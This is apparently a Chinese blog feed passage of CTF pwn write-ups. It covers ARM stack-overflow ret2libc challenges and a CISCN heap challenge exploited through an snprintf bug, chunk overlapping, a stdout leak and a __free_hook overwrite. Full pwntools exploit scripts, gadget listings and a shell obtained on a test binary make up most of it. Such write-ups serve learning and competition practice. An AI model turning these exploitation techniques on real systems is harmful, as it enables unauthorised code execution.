class="keyword">else</span>:</span><br><span class="line">    p = process(argv=[<span class="string">&#x27;qemu-arm&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/arm-linux-gnueabihf&#x27;</span>,<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line">    <span class="comment">#p = process(argv=[&#x27;qemu-arm&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;-L&#x27;,&#x27;/usr/arm-linux-gnueabihf&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(target=(&quot;localhost&quot;, 1234), exe=elf.path,gdbscript=&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># b *0x0001054C</span></span><br><span class="line"><span class="comment"># b *0x00010550</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">backdoor = elf.symbols[<span class="string">&#x27;backdoor&#x27;</span>]</span><br><span class="line">sla(<span class="string">b&#x27;Please enter your input:&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span> + p32(backdoor))</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h3 id="pwn347"><a href="#pwn347" class="headerlink" title="pwn347"></a>pwn347</h3><p>arm32，rop</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">le0n:pwn347/ $ checksec pwn                                                                               </span><br><span class="line">[*] <span class="string">&#x27;/home/le0n/challenge/ctfshow/pwn347/pwn&#x27;</span></span><br><span class="line">    Arch:       arm-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x10000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>

<p>漏洞依旧是栈溢出，只不过这次要进行arm32的ret2libc</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  logo();</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ropper查询gadgets，这个pop {r3, pc};可以和下面的万能gadget配合使用</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">(pwn/ELF/ARM)&gt; search pop</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop</span><br><span class="line">                                                                                                                                                                     [INFO] File: pwn</span><br><span class="line">0x00010548: pop &#123;r11, pc&#125;;</span><br><span class="line">0x000103a4: pop &#123;r3, pc&#125;;</span><br><span class="line">0x00010500: pop &#123;r4, pc&#125;;</span><br><span class="line">0x000106bc: pop &#123;r4, r5, r6, r7, r8, r9, r10, pc&#125;;</span><br><span class="line">0x000106bc: pop &#123;r4, r5, r6, r7, r8, r9, r10, pc&#125;; muleq r1, r8, r8; muleq r1, r0, r8; bx lr;</span><br><span class="line">0x000104f0: popne &#123;r4, pc&#125;; bl 0x47c; mov r3, <span class="comment">#1; strb r3, [r4]; pop &#123;r4, pc&#125;;</span></span><br></pre></td></tr></table></figure>

<p>查阅一些资料发现前面一直用的csu的gadgets好像可以充当我想要的gadgets，事实也是这样csu的这段gadget被称为万能gadget。</p>
<p>思路：</p>
<ol>
<li>通过puts来泄露libc基地址（备用printf），程序要导回ctfshow()函数</li>
<li>计算system，bin&#x2F;sh</li>
<li>再溢出来执行system</li>
</ol>
<p>有思路开干，因为puts和syste都只有一个函数所以试一下这段：</p>
<p><img data-src="/../images/image-20250717155011131.png" alt="image-20250717155011131"></p>
<p>exp(只能打通本地，远程不知道那个libc，泄露的地址也查不出来，呜~~):</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">ctfshow = elf.symbols[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">pop_r3_pc = <span class="number">0x000103a4</span></span><br><span class="line"><span class="comment"># csu_bl = 0x0001069C</span></span><br><span class="line">mov_r0r7_blxr3 = <span class="number">0x000106ac</span></span><br><span class="line">csu_pop = <span class="number">0x000106BC</span> <span class="comment">#只需要设置R7 = 参数、R6 = 1和R3 = got</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">132</span> + p32(csu_pop)</span><br><span class="line"><span class="comment"># payload += p32(0)*3 + p32(puts_got) #r7</span></span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">3</span> + p32(printf_got) <span class="comment">#r7</span></span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">3</span> + p32(pop_r3_pc) <span class="comment">#pc</span></span><br><span class="line">payload += p32(puts_plt) <span class="comment">#r3在栈上的</span></span><br><span class="line">payload += p32(mov_r0r7_blxr3)</span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload += p32(ctfshow)</span><br><span class="line">sla(<span class="string">b&quot;$ &quot;</span>,payload)</span><br><span class="line">puts_addr = uu32()</span><br><span class="line">leak(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;system&#x27;</span>, system)</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">leak(<span class="string">&#x27;binsh&#x27;</span>, binsh)</span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">132</span> + p32(csu_pop)</span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">3</span> + p32(binsh) <span class="comment">#r7</span></span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">3</span> + p32(pop_r3_pc) <span class="comment">#pc</span></span><br><span class="line">payload += p32(system) <span class="comment">#r3在栈上的</span></span><br><span class="line">payload += p32(mov_r0r7_blxr3)</span><br><span class="line">sla(<span class="string">b&quot;$ &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h3 id="pwn349"><a href="#pwn349" class="headerlink" title="pwn349"></a>pwn349</h3><p>aarch64只有一个溢出还是写地址在栈上，找不到gadget</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>arm</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn&amp;&amp;ccb半决赛复现</title>
    <url>/2025/04/07/ciscn&amp;&amp;ccb%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="typo"><a href="#typo" class="headerlink" title="typo"></a>typo</h1><p>ubuntu20.04，glibc2.31</p>
<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目中用到的结构体：</p>
<p><img data-src="/../images/image-20250407195503012.png" alt="image-20250407195503012"></p>
<p><img data-src="/../images/image-20250407195533099.png" alt="image-20250407195533099"></p>
<p>其他函数就不看了，看一下有漏洞的函数（edit）：</p>
<p><img data-src="/../images/image-20250407195725965.png" alt="image-20250407195725965"></p>
<p>可以看到在 <code>snprintf((char *)chunklist[v1], (size_t)&quot;%lu&quot;, s, 8LL); </code>存在问题</p>
<p><code>snprintf </code>的函数原型为：<code>int snprintf(char *s, size_t maxlen, const char *format, ...)</code></p>
<p>题目将<code> (size_t)&quot;%lu&quot;</code> （即它的地址）作为了<code>maxlen</code>传入，<code>format</code> 为用户输入，于是这里同时存在格式化字符串漏洞和堆溢出漏洞</p>
<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p>由于没有 show，没有什么直观的方法可以泄露 libc_base，不过见过的小伙伴一定可以第一实际想到用 _IO_2_1_stdout_ 进行泄露，在下文中，我也是这样实现的。</p>
<p>具体的利用步骤如下：</p>
<ul>
<li>利用堆溢出构造 chunk overlapping，接下来相当于可以实现double free（有的说是UAF，这里称呼为 A，B，并且 A，B 实际上为同一个 chunk）。</li>
<li>先将 A 放入 tcahebin，用堆溢出修改这个 chunk 大小，再放入 unsortedbin 中，这个时候，tcahebin 就残留了 main_arena 附近的地址。</li>
<li>再用堆溢出部分覆盖原 main_arena+96 地址为 _IO_2_1_stdout_ 附近地址，接下来就修改 _flag 为<code> 0xFBAD1800</code>， 将_IO_write_base 的地址末尾改为 00，即可泄露 libc。</li>
<li>有了 libc_base，后面就简单了，这里我改 __free_hook 为 system，接下来 getshell。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-04-07 20:46:31</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, ) </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line">gdb.attach(p,gdbscript = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    set debug-file-directory ./.debug/ </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&#x27;&gt;&gt; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">b&quot;New size of content: &quot;</span>,size)</span><br><span class="line">    sa(<span class="string">b&quot;What do you want to say: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">##本地调试可以先 echo 0 &gt; /proc/sys/kernel/randomize_va_space 禁用 ASLR</span></span><br><span class="line"><span class="comment"># 或者 sysctl -w kernel.randomize_va_space=0</span></span><br><span class="line"><span class="comment"># 没有show, 基本是要想办法泄露libc, 有了堆溢出, 因此可以利用 overlapping</span></span><br><span class="line"><span class="comment"># 然后结合 unsortedbin 来爆破 _IO_2_1_stdout_ 的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. unlink 合并到 top chunk (overlapping)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0xf0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x171</span>), <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">edit(<span class="number">9</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x100</span>), <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x58</span>+p64(<span class="number">0x100</span>+<span class="number">0x70</span>))</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 构造同一个 chunk 的 UAF (两大小不同的堆块控制)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0xf0</span>)<span class="comment">##chunk 9 == chunk 10</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x20</span>)</span><br><span class="line"><span class="comment"># 3. 将一个放入 tcahebin ,一个放入 unsortedbin 中, 让 tcahebin-&gt;next 为 libc 相关</span></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x50</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;1&#x27;</span>*<span class="number">0x58</span>+p64(<span class="number">0x61</span>), <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x58</span>+p64(<span class="number">0x101</span>),<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"><span class="comment"># # 于是，有了：0x60 [  1]: 0x55555555bad0 —▸ 0x7ffff7fc1be0 (main_arena+96)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # 4. 测试, 爆破 _IO_2_1_stdout_ 的地址，成功概率 1/16</span></span><br><span class="line"><span class="comment"># # pwndbg&gt; p &amp;_IO_2_1_stdout_</span></span><br><span class="line"><span class="comment"># # $1 = (struct _IO_FILE_plus *) 0x7ffff7fc26a0 &lt;_IO_2_1_stdout_&gt;</span></span><br><span class="line"><span class="comment"># 由于会 sprintf 会追加 &#x27;\x00&#x27;, 这里用后面的 read</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#edit(12, b&#x27;%p&#x27;*0x11+b&#x27;1&#x27;*10, b&#x27;\x00&#x27;)</span></span><br><span class="line">edit(<span class="number">12</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">166</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;11111&#x27;</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x58</span>+<span class="string">b&#x27;\x90\x26&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">14</span>, <span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">14</span>, <span class="string">b&#x27;\xff&#x27;</span>*<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span> + p32(<span class="number">0xFBAD1800</span>) + <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x25</span>-<span class="number">8</span>))</span><br><span class="line">r(<span class="number">8</span>)</span><br><span class="line">data = uu64(r(<span class="number">6</span>))</span><br><span class="line">leak(<span class="string">&#x27;data&#x27;</span>,data)</span><br><span class="line">libc_base = data - <span class="number">0x1ec980</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">one = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line">one_gadget = libc_base + one[<span class="number">1</span>]</span><br><span class="line">leak(<span class="string">&quot;free_hook&quot;</span>,free_hook)</span><br><span class="line">leak(<span class="string">&quot;system_addr&quot;</span>,system_addr)</span><br><span class="line">leak(<span class="string">&quot;one_gadget&quot;</span>,one_gadget)</span><br><span class="line"><span class="comment"># 5.getshell</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>+ p64(free_hook-<span class="number">0x10</span>), <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(one_gadget),<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    b<span class="string">&#x27;ls\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x25 bytes:</span><br><span class="line">    b<span class="string">&#x27;exp.py\tld-2.31.so  libc-2.31.so  pwn\n&#x27;</span></span><br><span class="line">exp.py    ld-2.31.so  libc-2.31.so  pwn</span><br><span class="line">$ <span class="built_in">cat</span> /flag</span><br><span class="line">[DEBUG] Sent 0xa bytes:</span><br><span class="line">    b<span class="string">&#x27;cat /flag\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x1a bytes:</span><br><span class="line">    b<span class="string">&#x27;flag&#123;this_is_a_test_flag&#125;\n&#x27;</span></span><br><span class="line">flag&#123;this_is_a_test_flag&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<h2 id="exp分析"><a href="#exp分析" class="headerlink" title="exp分析"></a>exp分析</h2><p><strong>exp思路理解分析：</strong></p>
<ol>
<li>这道题没有show()函数就不能像正常那样泄露地址，所以我们要劫持stdout</li>
<li>劫持stdout也需要libc地址，那么我们就需要将libc地址想办法布置到tcachebins中的next指针（或者其它）</li>
<li>存在堆溢出，可以通过overlapping来制造doubel free(同一个chunk即在tcache中，又在unsortedbin中)，从而实现申请一个堆块在stdout附近</li>
<li>最后，通过one_gadget等方式来getshell</li>
</ol>
<h3 id="unlink-合并到-top-chunk"><a href="#unlink-合并到-top-chunk" class="headerlink" title="unlink 合并到 top chunk"></a>unlink 合并到 top chunk</h3><p>unlink 合并到 top chunk(overlapping)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. unlink 合并到 top chunk (overlapping)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0xf0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x171</span>), <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">edit(<span class="number">9</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x100</span>), <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x58</span>+p64(<span class="number">0x100</span>+<span class="number">0x70</span>))</span><br><span class="line">delete(<span class="number">10</span>)</span><br></pre></td></tr></table></figure>

<p>我们的目标是让chunk 9实现double free</p>
<p>这里通过堆溢出制造overlapping_chunk9将chunk8 - 10都放入top chunk中</p>
<h3 id="构造同一个-chunk-的-UAF"><a href="#构造同一个-chunk-的-UAF" class="headerlink" title="构造同一个 chunk 的 UAF"></a>构造同一个 chunk 的 UAF</h3><p>构造同一个 chunk 的 UAF(两大小不同的堆块控制)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 2. 构造同一个 chunk 的 UAF (两大小不同的堆块控制)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0xf0</span>)<span class="comment">##chunk 9 == chunk 10</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x20</span>)</span><br></pre></td></tr></table></figure>

<p>这里就是再将top chunk中的chunk 9再次申请出来，我们通过一给chunk就控制了chunklist中两个chunk</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/24gx 0x555555554000+0x4060</span><br><span class="line">0x555555558060: 0x000055555555b8a0      0x000055555555b7a0</span><br><span class="line">0x555555558070: 0x000055555555b6a0      0x000055555555b5a0</span><br><span class="line">0x555555558080: 0x000055555555b4a0      0x000055555555b3a0</span><br><span class="line">0x555555558090: 0x000055555555b2a0      0x000055555555b9a0</span><br><span class="line">0x5555555580a0: 0x000055555555ba70      0x000055555555bad0</span><br><span class="line"><span class="comment">#               chunk 10                 chunk 9   </span></span><br><span class="line">0x5555555580b0: 0x000055555555bad0      0x000055555555bbd0</span><br><span class="line">0x5555555580c0: 0x000055555555b9d0      0x0000000000000000</span><br><span class="line">0x5555555580d0: 0x0000000000000000      0x0000000000000000                                               </span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p>将一个放入 tcahebin ,一个放入 unsortedbin 中, 让 tcahebin-&gt;next 为 libc 相关</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">13</span>,<span class="number">0x50</span>)<span class="comment">#这个是为了让tcachebins中0x60处next指针有效（即有两个以上的chunk）</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;1&#x27;</span>*<span class="number">0x58</span>+p64(<span class="number">0x61</span>), <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x58</span>+p64(<span class="number">0x101</span>),<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br></pre></td></tr></table></figure>

<p>我们直接进行delete(9)和delete(10)一样也会被检测出来double free；</p>
<p>所以可以通过修改chunk 9和chunk 10的大小，再进行free，是他们一个进入tcachebins中，一个进入unsortedbins中。</p>
<p>这也就实现了我们的目的，在tcahebins中的那个chunk的next指针上留下了libc地址。</p>
